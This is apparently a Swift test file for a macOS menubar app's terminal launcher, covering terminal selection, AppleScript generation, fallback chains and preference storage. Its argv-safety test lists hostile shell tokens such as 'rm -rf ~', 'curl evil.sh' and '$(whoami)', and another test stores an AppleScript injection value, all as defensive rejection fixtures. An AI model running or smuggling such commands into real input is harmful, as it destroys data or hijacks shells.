import Foundation
import Testing
@testable import CodeBurnMenubar

@Suite("Preferred terminal selection and script generation")
struct TerminalLauncherTests {
    // MARK: - Enum -> app path mapping

    @Test("Terminal.app keeps both stock install locations")
    func terminalKeepsStockPaths() {
        #expect(PreferredTerminal.terminal.appPaths == [
            "/System/Applications/Utilities/Terminal.app",
            "/Applications/Utilities/Terminal.app",
        ])
    }

    @Test("iTerm2 probes the system and per-user Applications folders")
    func iTermProbesBothApplicationsFolders() {
        let paths = PreferredTerminal.iTerm2.appPaths
        let home = FileManager.default.homeDirectoryForCurrentUser.path
        #expect(paths == ["/Applications/iTerm.app", "\(home)/Applications/iTerm.app"])
    }

    @Test("every case maps to absolute .app bundle paths")
    func everyCaseMapsToAbsoluteBundlePaths() {
        for terminal in PreferredTerminal.allCases {
            #expect(!terminal.appPaths.isEmpty)
            for path in terminal.appPaths {
                #expect(path.hasPrefix("/"))
                #expect(path.hasSuffix(".app"))
            }
        }
    }

    // MARK: - Script generation per terminal

    @Test("Terminal.app uses the `do script` dialect")
    func terminalUsesDoScript() {
        let script = PreferredTerminal.terminal.script(command: "codeburn report")
        #expect(script.contains("tell application \"Terminal\""))
        #expect(script.contains("do script \"codeburn report\""))
        #expect(script.contains("activate"))
        // iTerm2 verbs must not leak into the Terminal.app dialect.
        #expect(!script.contains("write text"))
        #expect(!script.contains("create window with default profile"))
    }

    @Test("iTerm2 uses the `create window` + `write text` dialect")
    func iTermUsesWriteText() {
        let script = PreferredTerminal.iTerm2.script(command: "codeburn report")
        #expect(script.contains("tell application \"iTerm\""))
        #expect(script.contains("create window with default profile"))
        #expect(script.contains("write text \"codeburn report\""))
        // `do script` is a Terminal.app-only verb; sending it to iTerm2 would fail silently.
        #expect(!script.contains("do script"))
    }

    @Test("iTerm2 is addressed as `iTerm`, the bundle name, so it compiles while the app is quit")
    func iTermIsAddressedByBundleName() {
        // Regression guard. `tell application "iTerm2"` only compiles while iTerm2 already
        // happens to be running; with the app quit AppleScript resolves the name through
        // LaunchServices by bundle file name (iTerm.app) and otherwise fails with -2741,
        // which made "Full Report" do nothing at all.
        let script = PreferredTerminal.iTerm2.script(command: "codeburn report")
        #expect(!script.contains("tell application \"iTerm2\""))
    }

    @Test("each case targets exactly one hardcoded application name")
    func eachCaseTargetsOneHardcodedApplication() {
        let names: [PreferredTerminal: String] = [.terminal: "Terminal", .iTerm2: "iTerm"]
        for terminal in PreferredTerminal.allCases {
            let script = terminal.script(command: "codeburn report")
            let tells = script.components(separatedBy: "tell application ").count - 1
            #expect(tells == 1)
            #expect(script.contains("tell application \"\(names[terminal]!)\""))
        }
    }

    @Test("the command is the only value interpolated into the script")
    func commandIsTheOnlyInterpolatedValue() {
        // Swapping the command must change nothing but the command occurrence, proving the
        // app name and verbs are compile-time literals rather than stored strings.
        for terminal in PreferredTerminal.allCases {
            let a = terminal.script(command: "codeburn report")
            let b = terminal.script(command: "codeburn optimize")
            #expect(a != b)
            #expect(a.replacingOccurrences(of: "codeburn report", with: "codeburn optimize") == b)
        }
    }

    // MARK: - Fallback selection when an app is absent

    @Test("the configured terminal is used when it is installed")
    func configuredTerminalWins() {
        let resolved = TerminalLauncher.resolvedTerminal(preference: .iTerm2, isInstalled: { _ in true })
        #expect(resolved == .iTerm2)
    }

    @Test("a missing configured terminal falls back to Terminal.app")
    func missingConfiguredTerminalFallsBackToTerminal() {
        let resolved = TerminalLauncher.resolvedTerminal(
            preference: .iTerm2,
            isInstalled: { $0 == .terminal }
        )
        #expect(resolved == .terminal)
    }

    @Test("nil is returned when nothing scriptable exists so the caller goes headless")
    func nothingInstalledResolvesToNil() {
        #expect(TerminalLauncher.resolvedTerminal(preference: .iTerm2, isInstalled: { _ in false }) == nil)
        #expect(TerminalLauncher.resolvedTerminal(preference: .terminal, isInstalled: { _ in false }) == nil)
    }

    @Test("Terminal.app preference never resolves to another terminal")
    func terminalPreferenceNeverResolvesElsewhere() {
        // iTerm2 installed but Terminal.app chosen and absent -> headless, not a surprise app.
        let resolved = TerminalLauncher.resolvedTerminal(
            preference: .terminal,
            isInstalled: { $0 == .iTerm2 }
        )
        #expect(resolved == nil)
    }

    // MARK: - Chain construction

    @Test("the chain is the configured terminal then Terminal.app as backstop")
    func chainPutsPreferenceFirstThenTerminal() {
        let chain = TerminalLauncher.terminalChain(preference: .iTerm2, isInstalled: { _ in true })
        #expect(chain == [.iTerm2, .terminal])
    }

    @Test("Terminal.app is never listed twice when it is also the preference")
    func chainDoesNotDuplicateTerminal() {
        let chain = TerminalLauncher.terminalChain(preference: .terminal, isInstalled: { _ in true })
        #expect(chain == [.terminal])
    }

    @Test("an uninstalled preference drops out of the chain entirely")
    func chainSkipsUninstalledPreference() {
        let chain = TerminalLauncher.terminalChain(preference: .iTerm2, isInstalled: { $0 == .terminal })
        #expect(chain == [.terminal])
    }

    @Test("no installed terminal yields an empty chain so the caller goes headless")
    func chainIsEmptyWhenNothingInstalled() {
        #expect(TerminalLauncher.terminalChain(preference: .iTerm2, isInstalled: { _ in false }).isEmpty)
    }

    // MARK: - Runtime fallback when a terminal is installed but osascript fails

    @Test("a terminal that fails at runtime falls through to the next candidate")
    func runtimeFailureFallsBackToNextTerminal() {
        // The real trigger: iTerm2 is installed, so it is picked, but osascript exits non-zero
        // (terminology it cannot load, a denied Automation prompt, a broken bundle). Before
        // this the launcher fired and forgot, so the user got no window and no error at all.
        var attempted: [PreferredTerminal] = []
        let used = TerminalLauncher.runFirstWorking(
            chain: [.iTerm2, .terminal],
            command: "codeburn report",
            attempt: { terminal, _ in
                attempted.append(terminal)
                return terminal == .terminal
            }
        )
        #expect(used == .terminal)
        #expect(attempted == [.iTerm2, .terminal])
    }

    @Test("a working first terminal short-circuits the rest of the chain")
    func successfulFirstTerminalStopsTheChain() {
        var attempted: [PreferredTerminal] = []
        let used = TerminalLauncher.runFirstWorking(
            chain: [.iTerm2, .terminal],
            command: "codeburn report",
            attempt: { terminal, _ in
                attempted.append(terminal)
                return true
            }
        )
        #expect(used == .iTerm2)
        #expect(attempted == [.iTerm2])
    }

    @Test("every candidate failing returns nil so the caller can go headless")
    func exhaustedChainReturnsNil() {
        var attempted: [PreferredTerminal] = []
        let used = TerminalLauncher.runFirstWorking(
            chain: [.iTerm2, .terminal],
            command: "codeburn report",
            attempt: { terminal, _ in
                attempted.append(terminal)
                return false
            }
        )
        #expect(used == nil)
        #expect(attempted == [.iTerm2, .terminal])
    }

    @Test("an empty chain attempts nothing and reports failure immediately")
    func emptyChainAttemptsNothing() {
        var attempts = 0
        let used = TerminalLauncher.runFirstWorking(
            chain: [],
            command: "codeburn report",
            attempt: { _, _ in
                attempts += 1
                return true
            }
        )
        #expect(used == nil)
        #expect(attempts == 0)
    }

    @Test("the command reaches each attempted terminal unchanged")
    func commandIsForwardedToEveryAttempt() {
        var seen: [String] = []
        _ = TerminalLauncher.runFirstWorking(
            chain: [.iTerm2, .terminal],
            command: "codeburn optimize",
            attempt: { _, command in
                seen.append(command)
                return false
            }
        )
        #expect(seen == ["codeburn optimize", "codeburn optimize"])
    }

    // MARK: - argv safety validation

    @Test("safe argv joins into a command")
    func safeArgvJoins() {
        #expect(TerminalLauncher.safeCommand(argv: ["codeburn", "report"]) == "codeburn report")
        #expect(
            TerminalLauncher.safeCommand(argv: ["/opt/homebrew/bin/codeburn", "optimize"])
                == "/opt/homebrew/bin/codeburn optimize"
        )
    }

    @Test("shell metacharacters are still rejected before reaching AppleScript")
    func unsafeArgvIsRejected() {
        let hostile = [
            "codeburn; rm -rf ~",
            "codeburn && curl evil.sh",
            "codeburn | tee /tmp/x",
            "$(whoami)",
            "`whoami`",
            "codeburn \"quoted\"",
            "codeburn'q",
            "codeburn\nreport",
            "codeburn > /tmp/x",
        ]
        for token in hostile {
            #expect(!CodeburnCLI.isSafe(token), "expected \(token) to be rejected")
            #expect(TerminalLauncher.safeCommand(argv: ["codeburn", token]) == nil)
        }
    }

    @Test("a single unsafe token poisons the whole argv")
    func oneUnsafeTokenRejectsEverything() {
        #expect(TerminalLauncher.safeCommand(argv: ["codeburn", "report", "; id"]) == nil)
        #expect(TerminalLauncher.safeCommand(argv: [""]) == nil)
    }

    // MARK: - Persistence

    @Test("preference defaults to Terminal.app when unset, preserving pre-#877 behaviour")
    func defaultsToTerminalWhenUnset() {
        let suiteName = "CodeBurnMenubarTests.\(UUID().uuidString)"
        let defaults = UserDefaults(suiteName: suiteName)!
        defer { TestDefaults.forget(suiteName) }

        #expect(PreferredTerminal.saved(defaults: defaults) == .terminal)
        #expect(PreferredTerminal.default == .terminal)
    }

    @Test("preference round-trips and unknown values collapse to the default")
    func preferenceRoundTripsAndRejectsGarbage() {
        let suiteName = "CodeBurnMenubarTests.\(UUID().uuidString)"
        let defaults = UserDefaults(suiteName: suiteName)!
        defer { TestDefaults.forget(suiteName) }

        PreferredTerminal.iTerm2.persist(defaults: defaults)
        #expect(defaults.string(forKey: PreferredTerminal.defaultsKey) == "iterm2")
        #expect(PreferredTerminal.saved(defaults: defaults) == .iTerm2)

        PreferredTerminal.terminal.persist(defaults: defaults)
        #expect(PreferredTerminal.saved(defaults: defaults) == .terminal)

        // A hand-written defaults value must never become a `tell application` target.
        defaults.set("Terminal\" \nto do shell script \"id", forKey: PreferredTerminal.defaultsKey)
        #expect(PreferredTerminal.saved(defaults: defaults) == .terminal)
    }
}
